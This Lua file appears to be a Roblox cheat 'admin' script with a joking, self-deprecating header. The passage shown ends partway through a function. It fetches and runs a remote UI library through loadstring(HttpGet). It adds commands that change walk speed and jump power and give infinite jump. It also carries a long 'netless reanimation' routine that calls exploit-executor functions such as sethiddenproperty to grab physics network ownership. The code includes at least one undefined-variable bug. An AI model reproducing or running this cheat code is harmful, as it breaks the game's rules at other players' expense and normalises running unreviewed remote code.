--[[

 __          __  _                            _                                  
 \ \        / / | |                          | |                                 
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___                            
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \                           
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |                          
   __\/_ \/_\___|_|\___\___/|_| |_| |_|\___|__\__\___/ _____ _   _  __      ____ 
  / ____|/ __ \|  \/  |  ____|     /\   |  __ \|  \/  |_   _| \ | | \ \    / /_ |
 | (___ | |  | | \  / | |__       /  \  | |  | | \  / | | | |  \| |  \ \  / / | |
  \___ \| |  | | |\/| |  __|     / /\ \ | |  | | |\/| | | | | . ` |   \ \/ /  | |
  ____) | |__| | |  | | |____   / ____ \| |__| | |  | |_| |_| |\  |    \  /   | |
 |_____/ \____/|_|  |_|______| /_/    \_\_____/|_|  |_|_____|_| \_|     \(_)  |_|

no  hate but like pls use other scripts and not mine.
use infinite yield or cmdx. please.
i do not own some code contained in this script
so pls not hate
fuck me
kms
write an essay of how shit my code is(ps: please do!)
open sour
 _____ _   _ _____ _____                                                                                      
/  ___| | | |_   _|_   _|               | |    | |
\ `--.| |_| | | |   | |     ___ ___   __| | ___| |
 `--. \  _  | | |   | |    / __/ _ \ / _` |/ _ \ |
/\__/ / | | |_| |_  | |   | (_| (_) | (_| |  __/_|
\____/\_| |_/\___/  \_/    \___\___/ \__,_|\___(_)

any code past this point is shit and trash.
be warned.
wear your super high tech glasses.
YOU. HAVE. BEEN. WARNED.
i do not own some of the code all credits to the original scripter
]]
function rotif(L_3_arg0,L_4_arg1)game.StarterGui:SetCore("SendNotification", {
                Title = L_3_arg0,
                Text = L_4_arg1,
                Duration = 5
        })end;local L_1_= loadstring(game:HttpGet('https://raw.githubusercontent.com/VisualRoblox/Roblox/main/UI-Libraries/Visual%20Command%20UI%20Library/Source.lua', true))()local L_2_= L_1_:CreateWindow({
        Name = 'Some Admin V.1',
        IntroText = 'inf yield better(prefix: ;)',
        IntroIcon = "https://cdn-icons-png.flaticon.com/512/2991/2991252.png",
        IntroBlur = true,
        IntroBlurIntensity = 15,
        Theme = L_1_.Themes.dark,
        Position = 'bottom',
        Draggable = false,
        Prefix = ';'
})L_2_:AddCommand('SetPrefix', {
        'New Prefix'
}, 'Changes The Prefix.', function(L_5_arg0, L_6_arg1)
        L_2_:ChangePrefix(L_5_arg0[1])
end)L_2_:AddCommand('Notify', {
        'String'
}, 'Creates A Notification.', function(L_7_arg0, L_8_arg1)
        L_2_:CreateNotification('Some Admin', L_7_arg0[1], 5)
end)L_2_:AddCommand('Rejoin', {}, 'rejoin same server.', function(L_9_arg0, L_10_arg1)
        local L_11_ = game:GetService("TeleportService")
        local L_12_ = game.Players.LocalPlayer
        L_11_:Teleport(game.PlaceId, L_12_)
end)L_2_:AddCommand('Rotif', {
        'Title{String}',
        'Text{String}'
}, 'Creates A RobloxNotification.', function(L_13_arg0, L_14_arg1)
        rotif(L_13_arg0[1], L_13_arg0[2])
end)L_2_:AddCommand('WalkSpeed', {
        'Interger'
}, 'change ur walk speed.', function(L_15_arg0, L_16_arg1)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = L_15_arg0[1]
end)L_2_:AddCommand('JumPower', {
        'Interger'
}, 'change ur Jump Power.', function(L_17_arg0, L_18_arg1)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = L_17_arg0[1]
end)L_2_:AddCommand('infjump', {}, 'infinite jump.', function(L_19_arg0, L_20_arg1)
        spawn(function()
                game:GetService("UserInputService").JumpRequest:connect(function()
                        game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
                end)
        end)
end)L_2_:AddCommand('Amongus', {}, 'Become Among the US.', function(L_21_arg0, L_22_arg1)
        local L_23_ = 1000 --velocity
--netboost usage:
--set to false to disable
--set to a vector3 value if you dont want the velocity to change
--set to a number to change the velocity in real time with magnitude equal to the number
        local L_24_ = 0.005 --used only in case netboost is set to a number value
--if magnitude of the real velocity of a part is lower than this
--then the fake velocity is being set to Vector3.new(0, netboost, 0)
--the lower value the less you jitter but you might loose network ownership
        local L_25_ = "shp" --simulation radius (net bypass) method
--"shp" - sethiddenproperty
--"ssr" - setsimulationradius
--false - disable
        local L_26_ = true --removes hingeConstraints and ballSocketConstraints from your character
        local L_27_ = false --disables the animate script and enables after reanimation
        local L_28_ = true --disables all localScripts parented to your character before reanimation
        local L_29_ = true --tries to convert your character to r6 if its r15
        local L_30_ = false --puts all tools from backpack to character and lets you hold them after reanimation
        local L_31_ = game:GetService("Players").RespawnTime + 0.5 --anti respawn delay
        local L_32_ = 3 --reanimation method
--methods:
--0 - breakJoints (takes [loadtime] seconds to laod)
--1 - limbs
--2 - limbs + anti respawn
--3 - limbs + breakJoints after [loadtime] seconds
--4 - remove humanoid + breakJoints
--5 - remove humanoid + limbs
        local L_33_ = 2 --AlignPosition mode
--modes:
--1 - AlignPosition rigidity enabled true
--2 - 2 AlignPositions rigidity enabled both true and false
--3 - AlignPosition rigidity enabled false
        local L_34_ = true --disable aligns for head and enable after neck is removed
        local L_35_ = game:GetService("Players").LocalPlayer
        local L_36_ = game:GetService("RunService")
        local L_37_ = L_36_.Stepped
        local L_38_ = L_36_.Heartbeat
        local L_39_ = L_36_.RenderStepped
        local L_40_ = game:GetService("StarterGui")
        local L_41_ = game:GetService("Workspace")
        local L_42_ = CFrame.new
        local L_43_ = Vector3.new
        local L_44_ = L_43_(0, 0, 0)
        local L_45_ = math.huge
        local L_46_ = L_35_.Character
        if not (L_46_ and L_46_.Parent) then
                return
        end
        for L_81_forvar0, L_82_forvar1 in pairs(L_46_:GetDescendants()) do
                if L_82_forvar1:IsA("CharacterMesh") or L_82_forvar1:IsA("SpecialMesh") then
                        L_82_forvar1:Destroy()
                end
        end
        L_46_:GetPropertyChangedSignal("Parent"):Connect(function()
                if not (L_46_ and L_46_.Parent) then
                        L_46_ = nil
                end
        end)
        local function L_47_func(L_83_arg0, L_84_arg1, L_85_arg2)
                local L_86_ = nil
                pcall(function()
                        for L_87_forvar0, L_88_forvar1 in pairs(L_83_arg0:GetChildren()) do
                                if (L_88_forvar1.Name == L_84_arg1) and L_88_forvar1:IsA(L_85_arg2) then
                                        L_86_ = L_88_forvar1
                                        break
                                end
                        end
                end)
                return L_86_
        end
        local function L_48_func(L_89_arg0, L_90_arg1)
                L_89_arg0.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001, 0.0001, 0.0001)
                local L_91_ = Instance.new("Attachment", L_89_arg0)
                L_91_.Orientation = L_44_
                L_91_.Position = L_44_
                L_91_.Name = "att0_" .. L_89_arg0.Name
                local L_92_ = Instance.new("Attachment", L_90_arg1)
                L_92_.Orientation = L_44_
                L_92_.Position = L_44_
                L_92_.Name = "att1_" .. L_90_arg1.Name
                if (L_33_ == 1) or (L_33_ == 2) then
                        local L_94_ = Instance.new("AlignPosition", L_91_)
                        L_94_.ApplyAtCenterOfMass = false
                        L_94_.MaxForce = L_45_
                        L_94_.MaxVelocity = L_45_
                        L_94_.ReactionForceEnabled = false
                        L_94_.Responsiveness = 200
                        L_94_.Attachment1 = L_92_
                        L_94_.Attachment0 = L_91_
                        L_94_.Name = "AlignPositionRtrue"
                        L_94_.RigidityEnabled = true
                end
                if (L_33_ == 2) or (L_33_ == 3) then
                        local L_95_ = Instance.new("AlignPosition", L_91_)
                        L_95_.ApplyAtCenterOfMass = false
                        L_95_.MaxForce = L_45_
                        L_95_.MaxVelocity = L_45_
                        L_95_.ReactionForceEnabled = false
                        L_95_.Responsiveness = 200
                        L_95_.Attachment1 = L_92_
                        L_95_.Attachment0 = L_91_
                        L_95_.Name = "AlignPositionRfalse"
                        L_95_.RigidityEnabled = false
                end
                local L_93_ = Instance.new("AlignOrientation", L_91_)
                L_93_.MaxAngularVelocity = L_45_
                L_93_.MaxTorque = L_45_
                L_93_.PrimaryAxisOnly = false
                L_93_.ReactionTorqueEnabled = false
                L_93_.Responsiveness = 200
                L_93_.Attachment1 = L_92_
                L_93_.Attachment0 = L_91_
                L_93_.RigidityEnabled = false
                if L_23_ then
                        L_89_arg0:GetPropertyChangedSignal("Parent"):Connect(function()
                                if not (L_89_arg0 and L_89_arg0.Parent) then
                                        L_89_arg0 = nil
                                end
                        end)
                        spawn(function()
                                if typeof(L_23_) == "Vector3" then
                                        local L_96_ = L_44_
                                        local L_97_ = L_44_
                                        while L_89_arg0 do
                                                L_89_arg0.Velocity = L_96_
                                                L_89_arg0.RotVelocity = L_97_
                                                L_38_:Wait()
                                                if L_89_arg0 then
                                                        L_96_ = L_89_arg0.Velocity
                                                        L_89_arg0.Velocity = L_23_
                                                        L_89_arg0.RotVelocity = L_44_
                                                        L_37_:Wait()
                                                end
                                        end
                                elseif typeof(L_23_) == "number" then
                                        local L_98_ = L_44_
                                        local L_99_ = L_44_
                                        while L_89_arg0 do
                                                L_89_arg0.Velocity = L_98_
                                                L_89_arg0.RotVelocity = L_99_
                                                L_38_:Wait()
                                                if L_89_arg0 then
                                                        local L_100_ = L_98_
                                                        local L_101_ = L_100_.Magnitude
                                                        if L_101_ < L_24_ then
                                                                L_100_ = L_43_(0, L_23_, 0)
                                                        else
                                                                local L_102_ = L_23_ / L_101_
                                                                L_100_ *= L_43_(L_102_, L_102_, L_102_)
                                                        end
                                                        L_98_ = L_89_arg0.Velocity
                                                        L_99_ = L_89_arg0.RotVelocity
                                                        L_89_arg0.Velocity = L_100_
                                                        L_89_arg0.RotVelocity = L_44_
                                                        L_37_:Wait()
                                                end
                                        end
                                end
                        end)
                end
        end
        local function L_49_func()
                local L_103_ = L_35_.Character
                local L_104_ = L_41_.CurrentCamera.CFrame
                local L_105_ = Instance.new("Model")
                local L_106_ = Instance.new("Humanoid", L_105_)
                L_35_.Character = L_105_
                L_106_.Health = 0
                L_35_.Character = L_103_
                L_105_:Destroy()
                local L_107_ = nil
                local function L_108_func()
                        L_107_:Disconnect()
                        L_41_.CurrentCamera.CFrame = L_104_
                end
                L_107_ = L_39_:Connect(L_108_func)
        end
        local L_50_ = (L_32_ == 4) or (L_32_ == 5)
        local L_51_ = (L_32_ == 0) or (L_32_ == 4)
        local L_52_ = (L_32_ == 0) or (L_32_ == 2) or (L_32_ == 3)
        L_30_ = L_30_ and L_47_func(L_35_, "Backpack", "Backpack")
        if L_25_ == "shp" then
                local L_109_ = sethiddenproperty or set_hidden_property or set_hidden_prop or sethiddenprop
                if L_109_ then
                        spawn(function()
                                while L_46_ and L_38_:Wait() do
                                        L_109_(L_35_, "SimulationRadius", L_45_)
                                end
                        end)
                end
        elseif L_25_ == "ssr" then
                local L_110_ = setsimulationradius or set_simulation_radius or set_sim_radius or setsimradius or set_simulation_rad or setsimulationrad
                if L_110_ then
                        spawn(function()
                                while L_46_ and L_38_:Wait() do
                                        L_110_(L_45_)
                                end
                        end)
                end
        end
        L_26_ = L_26_ and function(L_111_arg0)
                if L_111_arg0:IsA("HingeConstraint") or L_111_arg0:IsA("BallSocketConstraint") then
                        L_111_arg0.Parent = nil
                end
        end
        if L_26_ then
                for L_112_forvar0, L_113_forvar1 in pairs(L_46_:GetDescendants()) do
                        L_26_(L_113_forvar1)
                end
                L_46_.DescendantAdded:Connect(L_26_)
        end
        if L_52_ then
                L_49_func()
        end
        if L_32_ == 0 then
                wait(L_31_)
                if not L_46_ then
                        return
                end
        end
        if L_28_ then
                for L_114_forvar0, L_115_forvar1 in pairs(L_46_:GetChildren()) do
                        if L_115_forvar1:IsA("LocalScript") then
                                L_115_forvar1.Disabled = true
                        end
                end
        elseif L_27_ then
                local L_116_ = L_47_func(L_46_, "Animate", "LocalScript")
                if L_116_ and (not L_116_.Disabled) then
                        L_116_.Disabled = true
                else
                        L_27_ = false
                end
        end
        local L_53_ = L_46_:FindFirstChildOfClass("Humanoid")
        if L_53_ then
                for L_117_forvar0, L_118_forvar1 in pairs(L_53_:GetPlayingAnimationTracks()) do
                        L_118_forvar1:Stop()
                end
        end
        if L_30_ then
                for L_119_forvar0, L_120_forvar1 in pairs(L_30_:GetChildren()) do
                        if L_120_forvar1:IsA("Tool") then
                                L_120_forvar1.Parent = L_46_
                        end
                end
        end
        pcall(function()
                settings().Physics.AllowSleep = false
                settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
        end)
        local L_54_ = {}
        for L_121_forvar0, L_122_forvar1 in pairs(L_46_:GetDescendants()) do
                if L_122_forvar1.ClassName == "Script" then
                        table.insert(L_54_, L_122_forvar1)
                end
        end
        local L_55_ = {}
        for L_123_forvar0, L_124_forvar1 in pairs(L_46_:GetDescendants()) do
                if L_124_forvar1:IsA("BasePart") then
                        local L_125_ = tostring(L_123_forvar0)
                        local L_126_ = true
                        while L_126_ do
                                L_126_ = false
                                for L_127_forvar0, L_128_forvar1 in pairs(L_54_) do
                                        if L_128_forvar1.Name == L_125_ then
                                                L_126_ = true
                                        end
                                end
                                if L_126_ then
                                        L_125_ = L_125_ .. "_"
                                end
                        end
                        table.insert(L_55_, L_125_)
                        Instance.new("Script", L_124_forvar1).Name = L_125_
                end
        end
        L_46_.Archivable = true
        local L_56_ = L_46_:Clone()
        for L_129_forvar0, L_130_forvar1 in pairs(L_56_:GetDescendants()) do
                pcall(function()
                        L_130_forvar1.Transparency = 1
                        L_130_forvar1.Anchored = false
                end)
        end
        local L_57_ = Instance.new("Model", L_46_)
        L_57_.Name = L_57_.ClassName
        L_57_:GetPropertyChangedSignal("Parent"):Connect(function()
                if not (L_57_ and L_57_.Parent) then
                        L_57_ = nil
                end
        end)
        for L_131_forvar0, L_132_forvar1 in pairs(L_46_:GetChildren()) do
                if L_132_forvar1 ~= L_57_ then
                        if L_50_ and L_132_forvar1:IsA("Humanoid") then
                                L_132_forvar1:Destroy()
                        else
                                if L_30_ and L_132_forvar1:IsA("Tool") then
                                        for L_133_forvar0, L_134_forvar1 in pairs(L_132_forvar1:GetDescendants()) do
                                                if L_134_forvar1 and L_134_forvar1.Parent and L_134_forvar1:IsA("BasePart") then
                                                        local L_135_ = Instance.new("BodyVelocity", L_134_forvar1)
                                                        L_135_.Velocity = L_44_
                                                        L_135_.MaxForce = L_43_(1000, 1000, 1000)
                                                        L_135_.P = 1250
                                                        L_135_.Name = "bv_" .. L_132_forvar1.Name
                                                end
                                        end
                                end
                                L_132_forvar1.Parent = L_57_
                        end
                end
        end
        local L_58_ = L_47_func(L_57_, "Head", "BasePart")
        local L_59_ = L_47_func(L_57_, "Torso", "BasePart") or L_47_func(L_57_, "UpperTorso", "BasePart")
        if L_51_ then
                L_57_:BreakJoints()
        else
                if L_58_ and L_59_ then
                        for L_136_forvar0, L_137_forvar1 in pairs(L_57_:GetDescendants()) do
                                if L_137_forvar1:IsA("Weld") or L_137_forvar1:IsA("Snap") or L_137_forvar1:IsA("Glue") or L_137_forvar1:IsA("Motor") or L_137_forvar1:IsA("Motor6D") then
                                        local L_138_ = false
                                        if (L_137_forvar1.Part0 == L_59_) and (L_137_forvar1.Part1 == L_58_) then
                                                L_138_ = true
                                        end
                                        if (L_137_forvar1.Part0 == L_58_) and (L_137_forvar1.Part1 == L_59_) then
                                                L_138_ = true
                                        end
                                        if L_138_ then
                                                if L_34_ then
                                                        L_34_ = L_137_forvar1
                                                end
                                        else
                                                L_137_forvar1:Destroy()
                                        end
                                end
                        end
                end
                if L_32_ == 3 then
                        spawn(function()
                                wait(L_31_)
                                if L_57_ then
                                        L_57_:BreakJoints()
                                end
                        end)
                end
        end
        L_56_.Parent = L_46_
        for L_139_forvar0, L_140_forvar1 in pairs(L_56_:GetChildren()) do
                L_140_forvar1.Parent = L_46_
        end
        L_56_:Destroy()
        local L_60_ = {}
        for L_141_forvar0, L_142_forvar1 in pairs(L_57_:GetDescendants()) do
                if L_142_forvar1:IsA("BasePart") then
                        L_141_forvar0 = tostring(L_141_forvar0)
                        local L_143_ = nil
                        L_143_ = L_142_forvar1:GetPropertyChangedSignal("Parent"):Connect(function()
                                if not (L_142_forvar1 and L_142_forvar1.Parent) then
                                        L_143_:Disconnect()
                                        L_60_[L_141_forvar0] = nil
                                end
                        end)
                        L_60_[L_141_forvar0] = L_142_forvar1
                end
        end
        local L_61_ = nil
        local function L_62_func()
                if L_57_ then
                        for L_144_forvar0, L_145_forvar1 in pairs(L_60_) do
                                L_145_forvar1.CanCollide = false
                        end
                else
                        L_61_:Disconnect()
                end
        end
        L_61_ = L_37_:Connect(L_62_func)
        L_62_func()
        for L_146_forvar0, L_147_forvar1 in pairs(L_57_:GetDescendants()) do
                if (L_147_forvar1.ClassName == "Script") and table.find(L_55_, L_147_forvar1.Name) then
                        local L_148_ = L_147_forvar1.Parent
                        if L_148_:IsA("BasePart") then
                                for L_149_forvar0, L_150_forvar1 in pairs(L_46_:GetDescendants()) do
                                        if (L_150_forvar1.ClassName == "Script") and (L_150_forvar1.Name == L_147_forvar1.Name) and (not L_150_forvar1:IsDescendantOf(L_57_)) then
                                                local L_151_ = L_150_forvar1.Parent
                                                if (L_151_.ClassName == L_148_.ClassName) and (L_151_.Name == L_148_.Name) then
                                                        L_48_func(L_148_, L_151_)
                                                        break
                                                end
                                        end
                                end
                        end
                end
        end
        if (typeof(L_34_) == "Instance") and L_58_ and L_58_.Parent then
                local L_152_ = {}
                for L_153_forvar0, L_154_forvar1 in pairs(L_58_:GetDescendants()) do
                        if L_154_forvar1:IsA("AlignPosition") or L_154_forvar1:IsA("AlignOrientation") then
                                table.insert(L_152_, L_154_forvar1)
                                L_154_forvar1.Enabled = false
                        end
                end
                spawn(function()
                        while L_46_ and L_34_ and L_34_.Parent do
                                L_37_:Wait()
                        end
                        if not (L_46_ and L_58_ and L_58_.Parent) then
                                return
                        end
                        for L_155_forvar0, L_156_forvar1 in pairs(L_152_) do
                                pcall(function()
                                        L_156_forvar1.Enabled = true
                                end)
                        end
                end)
        end
        for L_157_forvar0, L_158_forvar1 in pairs(L_46_:GetDescendants()) do
                if L_158_forvar1 and L_158_forvar1.Parent then
                        if L_158_forvar1.ClassName == "Script" then
                                if table.find(L_55_, L_158_forvar1.Name) then
                                        L_158_forvar1:Destroy()
                                end
                        elseif not L_158_forvar1:IsDescendantOf(L_57_) then
                                if L_158_forvar1:IsA("Decal") then
                                        L_158_forvar1.Transparency = 1
                                elseif L_158_forvar1:IsA("ForceField") then
                                        L_158_forvar1.Visible = false
                                elseif L_158_forvar1:IsA("Sound") then
                                        L_158_forvar1.Playing = false
                                elseif L_158_forvar1:IsA("BillboardGui") or L_158_forvar1:IsA("SurfaceGui") or L_158_forvar1:IsA("ParticleEmitter") or L_158_forvar1:IsA("Fire") or L_158_forvar1:IsA("Smoke") or L_158_forvar1:IsA("Sparkles") then
                                        L_158_forvar1.Enabled = false
                                end
                        end
                end
        end
        if L_27_ then
                local L_159_ = L_47_func(L_46_, "Animate", "LocalScript")
                if L_159_ then
                        L_159_.Disabled = false
                end
        end
        if L_30_ then
                for L_160_forvar0, L_161_forvar1 in pairs(L_46_:GetChildren()) do
                        if L_161_forvar1:IsA("Tool") then
                                L_161_forvar1.Parent = L_30_
                        end
                end
        end
        local L_63_ = L_57_:FindFirstChildOfClass("Humanoid")
        local L_64_ = L_46_:FindFirstChildOfClass("Humanoid")
        if L_64_ then
                L_41_.CurrentCamera.CameraSubject = L_64_
                local L_162_ = nil
                local function L_163_func()
                        L_162_:Disconnect()
                        if L_46_ and L_64_ and (L_64_.Parent == L_46_) then
                                L_41_.CurrentCamera.CameraSubject = L_64_
                        end
                end
                L_162_ = L_39_:Connect(L_163_func)
                if L_63_ then
                        L_63_.Changed:Connect(function(L_164_arg0)
                                if (L_164_arg0 == "Jump") and L_64_ and L_64_.Parent then
                                        L_64_.Jump = L_63_.Jump
                                end
                        end)
                else
                        L_35_.Character = nil
                        L_35_.Character = L_46_
                end
        end
        local L_65_ = Instance.new("BindableEvent", L_46_)
        L_65_.Event:Connect(function()
                L_65_:Destroy()
                L_40_:SetCore("ResetButtonCallback", true)
                if L_50_ then
                        L_46_:BreakJoints()
                        return
                end
                if L_52_ then
                        if L_63_ and L_63_.Parent and (L_63_.Health > 0) then
                                L_57_:BreakJoints()
                                L_63_.Health = 0
                        end
                        L_49_func()
                else
                        if L_63_ and L_63_.Parent and (L_63_.Health > 0) then
                                L_57_:BreakJoints()
                                L_63_.Health = 0
                        end
                end
        end)
        L_40_:SetCore("ResetButtonCallback", L_65_)
        spawn(function()
                while L_46_ do
                        if L_63_ and L_63_.Parent and L_64_ and L_64_.Parent then
                                L_64_.Jump = L_63_.Jump
                        end
                        wait()
                end
                L_40_:SetCore("ResetButtonCallback", true)
        end)
        L_29_ = L_29_ and L_64_ and (L_64_.RigType == Enum.HumanoidRigType.R15)
        if L_29_ then
                local L_165_ = nil
                pcall(function()
                        L_165_ = L_47_func(L_46_, "HumanoidRootPart", "BasePart").CFrame
                end)
                if L_165_ then
                        local L_166_ = {
                                head = {
                                        Name = "Head",
                                        Size = L_43_(2, 1, 1),
                                        R15 = {
                                                Head = 0
                                        }
                                },
                                torso = {
                                        Name = "Torso",
                                        Size = L_43_(2, 2, 1),
                                        R15 = {
                                                UpperTorso = 0.2,
                                                LowerTorso = - 0.8
                                        }
                                },
                                root = {
                                        Name = "HumanoidRootPart",
                                        Size = L_43_(2, 2, 1),
                                        R15 = {
                                                HumanoidRootPart = 0
                                        }
                                },
                                leftArm = {
                                        Name = "Left Arm",
                                        Size = L_43_(1, 2, 1),
                                        R15 = {
                                                LeftHand = - 0.85,
                                                LeftLowerArm = - 0.2,
                                                LeftUpperArm = 0.4
                                        }
                                },
                                rightArm = {
                                        Name = "Right Arm",
                                        Size = L_43_(1, 2, 1),
                                        R15 = {
                                                RightHand = - 0.85,
                                                RightLowerArm = - 0.2,
                                                RightUpperArm = 0.4
                                        }
                                },
                                leftLeg = {
                                        Name = "Left Leg",
                                        Size = L_43_(1, 2, 1),
                                        R15 = {
                                                LeftFoot = - 0.85,
                                                LeftLowerLeg = - 0.15,
                                                LeftUpperLeg = 0.6
                                        }
                                },
                                rightLeg = {
                                        Name = "Right Leg",
                                        Size = L_43_(1, 2, 1),
                                        R15 = {
                                                RightFoot = - 0.85,
                                                RightLowerLeg = - 0.15,
                                                RightUpperLeg = 0.6
                                        }
                                }
                        }
                        for L_168_forvar0, L_169_forvar1 in pairs(L_46_:GetChildren()) do
                                if L_169_forvar1:IsA("BasePart") then
                                        for L_170_forvar0, L_171_forvar1 in pairs(L_169_forvar1:GetChildren()) do
                                                if L_171_forvar1:IsA("Motor6D") then
                                                        L_171_forvar1.Part0 = nil
                                                end
                                        end
                                end
                        end
                        for L_172_forvar0, L_173_forvar1 in pairs(L_166_) do
                                local L_174_ = Instance.new("Part")
                                L_174_.Name = L_173_forvar1.Name
                                L_174_.Size = L_173_forvar1.Size
                                L_174_.CFrame = L_165_
                                L_174_.Anchored = false
                                L_174_.Transparency = 1
                                L_174_.CanCollide = false
                                for L_175_forvar0, L_176_forvar1 in pairs(L_173_forvar1.R15) do
                                        local L_177_ = L_47_func(L_46_, L_175_forvar0, "BasePart")
                                        local L_178_ = L_47_func(L_177_, "att1_" .. L_175_forvar0, "Attachment")
                                        if L_177_ then
                                                local L_179_ = Instance.new("Weld", L_177_)
                                                L_179_.Name = "Weld_" .. L_175_forvar0
                                                L_179_.Part0 = L_174_
                                                L_179_.Part1 = L_177_
                                                L_179_.C0 = L_42_(0, L_176_forvar1, 0)
                                                L_179_.C1 = L_42_(0, 0, 0)
                                                L_177_.Massless = true
                                                L_177_.Name = "R15_" .. L_175_forvar0
                                                L_177_.Parent = L_174_
                                                if L_178_ then
                                                        L_178_.Parent = L_174_
                                                        L_178_.Position = L_43_(0, L_176_forvar1, 0)
                                                end
                                        end
                                end
                                L_174_.Parent = L_46_
                                L_166_[L_172_forvar0] = L_174_
                        end
                        local L_167_ = {
                                neck = {
                                        Parent = L_166_.torso,
                                        Name = "Neck",
                                        Part0 = L_166_.torso,
                                        Part1 = L_166_.head,
                                        C0 = L_42_(0, 1, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0),
                                        C1 = L_42_(0, - 0.5, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0)
                                },
                                rootJoint = {
                                        Parent = L_166_.root,
                                        Name = "RootJoint",
                                        Part0 = L_166_.root,
                                        Part1 = L_166_.torso,
                                        C0 = L_42_(0, 0, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0),
                                        C1 = L_42_(0, 0, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0)
                                },
                                rightShoulder = {
                                        Parent = L_166_.torso,
                                        Name = "Right Shoulder",
                                        Part0 = L_166_.torso,
                                        Part1 = L_166_.rightArm,
                                        C0 = L_42_(1, 0.5, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0),
                                        C1 = L_42_(- 0.5, 0.5, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0)
                                },
                                leftShoulder = {
                                        Parent = L_166_.torso,
                                        Name = "Left Shoulder",
                                        Part0 = L_166_.torso,
                                        Part1 = L_166_.leftArm,
                                        C0 = L_42_(-1, 0.5, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0),
                                        C1 = L_42_(0.5, 0.5, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0)
                                },
                                rightHip = {
                                        Parent = L_166_.torso,
                                        Name = "Right Hip",
                                        Part0 = L_166_.torso,
                                        Part1 = L_166_.rightLeg,
                                        C0 = L_42_(1,-1, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0),
                                        C1 = L_42_(0.5, 1, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0)
                                },
                                leftHip = {
                                        Parent = L_166_.torso,
                                        Name = "Left Hip",
                                        Part0 = L_166_.torso,
                                        Part1 = L_166_.leftLeg,
                                        C0 = L_42_(-1,-1, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0),
                                        C1 = L_42_(- 0.5, 1, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0)
                                }
                        }
                        for L_180_forvar0, L_181_forvar1 in pairs(L_167_) do
                                local L_182_ = Instance.new("Motor6D")
                                for L_183_forvar0, L_184_forvar1 in pairs(L_181_forvar1) do
                                        L_182_[L_183_forvar0] = L_184_forvar1
                                end
                                L_167_[L_180_forvar0] = L_182_
                        end
                        L_64_.RigType = Enum.HumanoidRigType.R6
                        L_64_.HipHeight = 0
                end
        end
        wait()
        if not L_46_ then
                return
        end
        local L_66_ = false
        local L_67_ = false
        local L_68_ = false
        local L_69_ = false
        local L_70_ = false
        local L_71_ = false
        local L_72_ = false
        local L_73_ = false
        local L_74_ = false
        local L_75_ = 0
        local L_76_ = L_35_:GetMouse()
        local L_77_ = {
                ["RootJoint"] = "",
                ["Neck"] = "",
                ["Right Hip"] = "",
                ["Left Hip"] = "",
                ["Left Shoulder"] = "",
                ["Right Shoulder"] = ""
        }
        for L_185_forvar0, L_186_forvar1 in pairs(L_46_:GetDescendants()) do
                if L_186_forvar1:IsA("Motor6D") and (L_77_[L_186_forvar1.Name] == "") and (not L_186_forvar1:IsDescendantOf(L_57_)) then
                        L_77_[L_186_forvar1.Name] = L_186_forvar1
                end
        end
        for L_187_forvar0, L_188_forvar1 in pairs(L_77_) do
                if L_188_forvar1 and (L_188_forvar1 ~= "") then
                        L_188_forvar1.C0 = L_42_(0, 0, 0)
                        L_188_forvar1.C1 = L_42_(0, 0, 0)
                else
                        return
                end
        end
        local L_78_ = L_47_func(L_46_, "HumanoidRootPart", "BasePart")
        if not L_78_ then
                return
        end
        local function L_79_func(L_189_arg0)
                local L_190_, L_191_ = L_189_arg0.Part0, L_189_arg0.Part1
                L_189_arg0.Part1, L_189_arg0.Part0 = L_190_, L_191_
        end
        L_79_func(L_77_["Left Shoulder"])
        L_79_func(L_77_["Right Shoulder"])
        L_79_func(L_77_["Left Hip"])
        L_79_func(L_77_["Right Hip"])
        for L_192_forvar0, L_193_forvar1 in pairs(L_46_:GetChildren()) do
                if L_193_forvar1:IsA("Accessory") then
                        L_193_forvar1:Destroy()
                end
        end
        L_77_.Neck.C0 = L_42_(0, 0.3, - 0.5)
        L_76_.Button1Down:Connect(function()
                if not (kill or L_68_ or L_71_) then
                        L_69_ = true
                        L_67_ = false
                        L_64_.WalkSpeed = 0
                        wait(0.5)
                        L_64_.WalkSpeed = 16
                        L_69_ = false
                end
        end)
        L_76_.KeyDown:Connect(function(L_194_arg0)
                if not L_46_ then
                        return
                end
                L_194_arg0 = L_194_arg0:lower()
                if k == "e" then
                        if not L_66_ then
                                L_70_ = false
                                L_68_ = false
                                L_66_ = true
                                L_67_ = true
                                L_64_.WalkSpeed = 100
                                position = "ventidle"
                        elseif L_66_ then
                                L_66_ = false
                                L_67_ = false
                                L_64_.WalkSpeed = 16
                        end
                elseif L_194_arg0 == "f" then
                        if not L_70_ then
                                L_66_ = false
                                L_67_ = false
                                L_70_ = true
                                L_68_ = true
                                L_73_ = false
                                L_74_ = false
                                L_64_.WalkSpeed = 60
                        elseif L_70_ then
                                L_70_ = false
                                L_68_ = false
                                L_64_.WalkSpeed = 16
                        end
                elseif L_194_arg0 == "q" then
                        if L_72_ == false then
                                L_66_ = false
                                L_67_ = false
                                L_70_ = false
                                L_68_ = false
                                L_72_ = true
                                L_71_ = true
                                L_73_ = false
                                L_74_ = false
                                L_64_.WalkSpeed = 0
                        elseif L_72_ == true then
                                L_72_ = false
                                L_71_ = false
                                L_64_.WalkSpeed = 16
                        end
                elseif L_194_arg0 == "c" then
                        if L_73_ == false then
                                L_66_ = false
                                L_67_ = false
                                L_70_ = false
                                L_68_ = false
                                L_72_ = false
                                L_71_ = false
                                L_73_ = true
                                L_74_ = true
